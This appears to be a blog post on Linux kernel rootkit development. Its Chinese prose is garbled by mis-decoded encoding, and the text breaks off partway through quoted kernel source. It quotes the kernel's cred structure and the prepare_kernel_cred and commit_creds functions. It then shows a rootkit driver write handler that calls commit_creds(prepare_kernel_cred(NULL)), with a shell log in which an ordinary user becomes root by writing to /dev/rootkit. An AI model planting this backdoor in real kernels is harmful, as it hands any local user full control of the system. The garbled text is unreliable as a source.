<p>åœ¨ç¼–è¯‘æ—¶é‡åˆ°äº†è¿™æ ·ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨æˆ‘æ‰€æŒ‡å‘çš„Linuxå†…æ ¸è·¯å¾„ä¸‹ç¼ºå°‘äº†<code>script/module.lds</code>æ–‡ä»¶ï¼Œå¯¼è‡´ç¼–è¯‘å‡ºé”™ã€‚ç»è¿‡ä¸æ–­çš„æŸ¥æ‰¾ç½‘ä¸Šè¯´æ˜¯å› ä¸ºæˆ‘åœ¨ç¼–è¯‘å†…æ ¸æ—¶å¹¶æ²¡æœ‰ç¼–è¯‘é©±åŠ¨æ¨¡å—å¯¼è‡´çš„ï¼Œå› ä¸ºæˆ‘ç¼–è¯‘å†…æ ¸æ—¶ç¡®å®æ˜¯ä½¿ç”¨çš„<code>make vmlinux / make bzImage</code>ã€‚æ‰€ä»¥æˆ‘åšçš„å°±æ˜¯å»ç¼–è¯‘ä¸€ä¸‹é©±åŠ¨ï¼Œä½†æ˜¯å› ä¸ºæˆ‘ä¸‹è½½çš„Linuxæºç æ˜¯åœ¨å…±äº«ç›®å½•è§£åŒ…çš„ç¼˜æ•…ä¼šå­˜åœ¨è§£åŒ…ä¸å®Œå…¨çš„æƒ…å†µå¯¼è‡´åœ¨ç¼–è¯‘é©±åŠ¨æ—¶å‡ºç°åŒ…å«é”™è¯¯ï¼Œå¹¶ä¸”æˆ‘çš„ubuntuè™šæ‹Ÿæœºå·²ç»æœ‰70Gçš„å¤§å°äº†ï¼ˆæ‡’ç‹—ä¸€ç›´æ²¡æœ‰è¿›è¡Œæ¸…ç†è¿‡ï¼‰ï¼Œè¿™ä¹Ÿå¯¼è‡´æˆ‘è®²æºç æ”¾åˆ°ubuntuå®¶ç›®å½•è§£åŒ…ä¹‹åå› ä¸ºå¤§å°ä¸è¶³å¯¼è‡´å¤±è´¥ï¼Œæ‰€ä»¥æ˜¯å¦çœŸçš„å¯ä»¥é€šè¿‡<code>make modules</code>æˆ‘ä¹Ÿä¸çŸ¥é“ã€‚</p>
<p>æœ€ç»ˆçš„è§£å†³åŠæ³•æ˜¯<code>touch ./linux-5.11/script/module.lds</code>å°±å¥½äº†ï¼ï¼ï¼</p>
<p>è‡³äºä¸ºä»€ä¹ˆï¼Œæ˜¯å› ä¸º<code>scripts/module.lds</code> æ–‡ä»¶é€šå¸¸ç”¨äºé“¾æ¥å†…æ ¸æ¨¡å—ï¼ˆé©±åŠ¨ç¨‹åºï¼‰çš„ç¬¦å·è¡¨å’Œåœ°å€ã€‚å½“ä½ çš„é©±åŠ¨ç¨‹åºæ²¡æœ‰ç‰¹å®šçš„é“¾æ¥è„šæœ¬æ—¶ï¼Œç¼–è¯‘å™¨ä¼šä½¿ç”¨é»˜è®¤çš„é“¾æ¥è„šæœ¬ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸€äº›é»˜è®¤çš„ç¬¦å·å’Œåœ°å€ã€‚åˆ›å»ºä¸€ä¸ªç©ºçš„ <code>module.lds</code> æ–‡ä»¶å®é™…ä¸Šæ˜¯ä¸€ç§â€œå ä½ç¬¦â€æ–¹æ³•ã€‚å®ƒå‘Šè¯‰ç¼–è¯‘å™¨ï¼šâ€œå˜¿ï¼Œæˆ‘çŸ¥é“ä½ éœ€è¦ä¸€ä¸ªé“¾æ¥è„šæœ¬ï¼Œä½†æˆ‘ä¸éœ€è¦è‡ªå®šä¹‰çš„ç¬¦å·æˆ–åœ°å€ã€‚è¯·ä½¿ç”¨é»˜è®¤çš„é“¾æ¥è„šæœ¬â€ã€‚å› æ­¤ï¼Œå³ä½¿æ˜¯ç©ºçš„ <code>module.lds</code> æ–‡ä»¶ä¹Ÿè¶³å¤Ÿè®©ç¼–è¯‘å™¨æˆåŠŸé“¾æ¥ä½ çš„é©±åŠ¨ç¨‹åºã€‚</p>
<h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span>	usage;</span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>

<p>ç›¸ä¿¡å‰é¢è¿™ä¸ª<code>cred</code>ç»“æ„ä½“å¤§å®¶éƒ½ä¸é™Œç”Ÿï¼Œåœ¨Linuxä¸­æ¯ä¸€ä¸ªè¿›ç¨‹åœ¨kernelä¸­éƒ½æœ‰ä¸ä¹‹å¯¹åº”çš„credç»“æ„ä½“ç”¨ä»¥æ ‡è¯†å…¶æƒé™ã€‚</p>
<p>è¿™é‡Œä¸»è¦å…³æ³¨å…¶ä¸­çš„uidï¼š</p>
<p>é¦–å…ˆæ˜¯ç»“æ„ä½“å¼€å¤´çš„uidå³çœŸå®ç”¨æˆ·æ³¨é‡Šä¸º<code>real UID of the task</code>ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªè¿›ç¨‹å¯åŠ¨æ—¶çš„ç”¨æˆ·IDã€‚</p>
<p>éšåæ˜¯suidå³ä¿å­˜ç”¨æˆ·idæ³¨é‡Šä¸º<code>saved UID of the task</code>ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªè¿›ç¨‹æœ€åˆçš„æœ‰æ•ˆIDã€‚</p>
<p>ç„¶åæ˜¯euidå³æœ‰æ•ˆç”¨æˆ·idæ³¨é‡Šä¸º<code>effective UID of the task</code>ï¼Œç”¨äºæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹æ­£åœ¨è¿è¡Œæ—¶æ‰€å±çš„ç”¨æˆ·IDï¼Œä¸€ä¸ªè¿›ç¨‹åœ¨è¿è¡Œé€”ä¸­æ˜¯å¯ä»¥æ”¹å˜è‡ªå·±æ‰€å±ç”¨æˆ·çš„ï¼Œå› è€Œæƒé™æœºåˆ¶ä¹Ÿæ˜¯é€šè¿‡æœ‰æ•ˆç”¨æˆ·IDè¿›è¡Œè®¤è¯çš„ã€‚</p>
<p>æœ€åæ˜¯fsuidå³æ–‡ä»¶ç³»ç»Ÿç”¨æˆ·idæ³¨é‡Šä¸º<code>UID for VFS ops</code>ï¼Œç”¨äºæ ‡è¯†ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºæ–‡ä»¶æ—¶è¿›è¡Œæ ‡è¯†çš„ç”¨æˆ·IDã€‚</p>
<h3 id="é€šè¿‡commit-creds-prepare-kernel-cred-NULL-ææƒ"><a href="#é€šè¿‡commit-creds-prepare-kernel-cred-NULL-ææƒ" class="headerlink" title="é€šè¿‡commit_creds(prepare_kernel_cred(NULL))ææƒ"></a>é€šè¿‡commit_creds(prepare_kernel_cred(NULL))ææƒ</h3><p>æœ‰kernel pwnåŸºç¡€çš„æœ‹å‹éƒ½çŸ¥é“å¦‚æœæˆ‘ä»¬ç›´æ¥ä¿®æ”¹å‰é¢çš„æ‰€æœ‰uidä¸º0å³å¯å®ç°ææƒï¼Œæ‰€ä»¥è¿™é‡Œå­˜åœ¨ä¸¤ç§ææƒæ–¹å¼ï¼Œä¸€ç§æ˜¯ä½ç‰ˆæœ¬å†…æ ¸ç‰ˆæœ¬çš„ä½¿ç”¨<code>commit_creds(prepare_kernel_cred(NULL))</code>è¿›è¡Œææƒï¼Œç¬¬äºŒç§å°±æ˜¯é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“äº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (daemon)</span><br><span class="line">		old = get_task_cred(daemon);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">	validate_creds(old);</span><br><span class="line"></span><br><span class="line">	*<span class="keyword">new</span> = *old;</span><br><span class="line">	<span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">	get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">	get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">	get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	put_cred(old);</span><br><span class="line">	validate_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	put_cred(<span class="keyword">new</span>);</span><br><span class="line">	put_cred(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_kernel_cred);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°åœ¨ä½ç‰ˆæœ¬çš„å‡½æ•°ä¸­å¦‚æœä¼ å…¥çš„æ˜¯NULLï¼Œåˆ™ç›´æ¥ä¼šå»<code>init_cred</code>ä¸ºoldæœ€åå¤åˆ¶ç»™newã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (WARN_ON_ONCE(!daemon))</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line">	old = get_task_cred(daemon);</span><br><span class="line">	validate_creds(old);</span><br><span class="line"></span><br><span class="line">	*<span class="keyword">new</span> = *old;</span><br><span class="line">	<span class="keyword">new</span>-&gt;non_rcu = <span class="number">0</span>;</span><br><span class="line">	atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">	set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">	get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">	get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">	get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">new</span>-&gt;ucounts = get_ucounts(<span class="keyword">new</span>-&gt;ucounts);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="keyword">new</span>-&gt;ucounts)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL_ACCOUNT) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">	put_cred(old);</span><br><span class="line">	validate_creds(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">	put_cred(<span class="keyword">new</span>);</span><br><span class="line">	put_cred(old);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(prepare_kernel_cred);</span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢æ˜¯<code>linux 6.2</code>ç‰ˆæœ¬ä¸­çš„å‡½æ•°å†…éƒ¨ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœä¾æ—§ä¼ å…¥NULLåˆ™ä¼šç›´æ¥è¿”å›NULLå¯¼è‡´å¤±è´¥ã€‚</p>
<p>ä¸è¿‡è¿™é‡Œæˆ‘åšæ¼”ç¤ºçš„ç¼–è¯‘çš„å†…æ ¸ç‰ˆæœ¬ä¸º5.10æ‰€ä»¥è¿˜æ˜¯å¯ä»¥é€šè¿‡è¿™ä¸€æ–¹å¼è¿›è¡Œæ¼”ç¤ºã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">rootkit_write</span><span class="params">(struct file *__file, <span class="keyword">const</span> <span class="keyword">char</span> __user *user_buf, <span class="keyword">size_t</span> size, <span class="keyword">loff_t</span> *__loff)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆä¿®æ”¹æˆ‘ä»¬çš„ä»»æ„ä¸€ä¸ªå‡½æ•°å†…å®¹ä¸º<code>commit_creds(prepare_kernel_cred(NULL))</code>å³å¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~ $ id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ <span class="built_in">echo</span> a &gt; /dev/rootkit </span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>éšåç›´æ¥å¾€é©±åŠ¨ä¸­å†™å…¥æ•°æ®å³å¯å®ç°ææƒã€‚</p>
<h3 id="é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“å®ç°ææƒ"><a href="#é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“å®ç°ææƒ" class="headerlink" title="é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“å®ç°ææƒ"></a>é€šè¿‡ç›´æ¥ä¿®æ”¹credç»“æ„ä½“å®ç°ææƒ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> =</span> current;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> =</span> task-&gt;real_cred;</span><br><span class="line"></span><br><span class="line">	kdebug(<span class="string">&quot;commit_creds(%p&#123;%d,%d&#125;)&quot;</span>, <span class="keyword">new</span>,</span><br><span class="line">	       atomic_read(&amp;<span class="keyword">new</span>-&gt;usage),</span><br><span class="line">	       read_cred_subscribers(<span class="keyword">new</span>));</span><br><span class="line"></span><br><span class="line">	BUG_ON(task-&gt;cred != old);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	BUG_ON(read_cred_subscribers(old) &lt; <span class="number">2</span>);</span><br><span class="line">	validate_creds(old);</span><br><span class="line">	validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	BUG_ON(atomic_read(&amp;<span class="keyword">new</span>-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	get_cred(<span class="keyword">new</span>); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* dumpability changes */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(old-&gt;euid, <span class="keyword">new</span>-&gt;euid) ||</span><br><span class="line">	    !gid_eq(old-&gt;egid, <span class="keyword">new</span>-&gt;egid) ||</span><br><span class="line">	    !uid_eq(old-&gt;fsuid, <span class="keyword">new</span>-&gt;fsuid) ||</span><br><span class="line">	    !gid_eq(old-&gt;fsgid, <span class="keyword">new</span>-&gt;fsgid) ||</span><br><span class="line">	    !cred_cap_issubset(old, <span class="keyword">new</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">			set_dumpable(task-&gt;mm, suid_dumpable);</span><br><span class="line">		task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * If a task drops privileges and becomes nondumpable,</span></span><br><span class="line"><span class="comment">		 * the dumpability change must become visible before</span></span><br><span class="line"><span class="comment">		 * the credential change; otherwise, a __ptrace_may_access()</span></span><br><span class="line"><span class="comment">		 * racing with this change may be able to attach to a task it</span></span><br><span class="line"><span class="comment">		 * shouldn&#x27;t be able to attach to (as if the task had dropped</span></span><br><span class="line"><span class="comment">		 * privileges without becoming nondumpable).</span></span><br><span class="line"><span class="comment">		 * Pairs with a read barrier in __ptrace_may_access().</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		smp_wmb();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* alter the thread keyring */</span></span><br><span class="line">	<span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">		key_fsuid_changed(<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;fsgid, 